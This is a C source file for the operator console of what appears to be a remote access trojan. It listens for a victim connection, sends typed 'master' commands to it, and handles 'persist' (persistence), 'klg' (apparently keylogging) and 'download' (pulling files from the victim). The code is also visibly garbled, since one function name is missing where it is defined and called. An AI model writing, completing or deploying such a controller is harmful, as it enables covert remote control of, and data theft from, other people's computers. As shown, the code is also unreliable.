#include "server.h"

int main()
{

    ServerSide_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (setsockopt(ServerSide_Socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
        return -1;

    Define_Server_Node();

    bind(ServerSide_Socket, (struct sockaddr *) &Server_Address, sizeof(Server_Address));

    listen(ServerSide_Socket, 5);
    Client_Address_Length = sizeof(CLIENT_ADDRESS);
    ClientSide_Socket = accept(ServerSide_Socket, (struct sockaddr *) &CLIENT_ADDRESS, &Client_Address_Length);

    while(ALWAYS)
    {
        ();

        printf("* Shell#%s~$: ", inet_ntoa(CLIENT_ADDRESS.sin_addr));
        fgets(Masters_Command, sizeof(Masters_Command), stdin);

        strtok(Masters_Command, "\n");
        write(ClientSide_Socket, Masters_Command, sizeof(Masters_Command));

        if (Masters_Command_Equal_to("cd "))
            continue;

        else if (Masters_Command_Equal_to("persist"))
            INITIATE_PERSISTENCE();

        else if (Masters_Command_Equal_to("klg"))
			continue;

        else if (Masters_Command_Equal_to("download"))
            Download_File();

        else if (Masters_Command_Equal_to("q"))
            continue;


        else
        {
            recv(ClientSide_Socket, RESPONSE_FROM_CLIENT, sizeof(RESPONSE_FROM_CLIENT), MSG_WAITALL);
            printf("%s", RESPONSE_FROM_CLIENT);
        }
    }

    return 0;
}

void Define_Server_Node()
{
    Server_Address.sin_family = AF_INET;
    Server_Address.sin_port = htons(SERVER_PORT);
    Server_Address.sin_addr.s_addr = inet_addr(SERVER_IP);
}

void ()
{
    memset(&Masters_Command, 0, sizeof(Masters_Command));
    memset(&RESPONSE_FROM_CLIENT, 0, sizeof(RESPONSE_FROM_CLIENT));
}

int Masters_Command_Equal_to(char cmd[])
{
    return !strncmp(cmd, Masters_Command, strlen(cmd));
}

void INITIATE_PERSISTENCE()
{
    recv(ClientSide_Socket, RESPONSE_FROM_CLIENT, sizeof(RESPONSE_FROM_CLIENT), 0);
    printf("%s", RESPONSE_FROM_CLIENT);
    printf("\n");
}


void Download_File()
{


    char Filename[256];

    int Bytes_Received = recv(ClientSide_Socket, Filename, sizeof(Filename) - 1, 0);

    Filename[Bytes_Received] = '\0';

    FILE *File_Being_Dowloaded = fopen(Filename, "wb");

    while(recv(ClientSide_Socket, BUFFER, sizeof(BUFFER), 0) > 0)
        fwrite(BUFFER, 1, strlen(BUFFER), File_Being_Dowloaded);

    fclose(File_Being_Dowloaded);


}
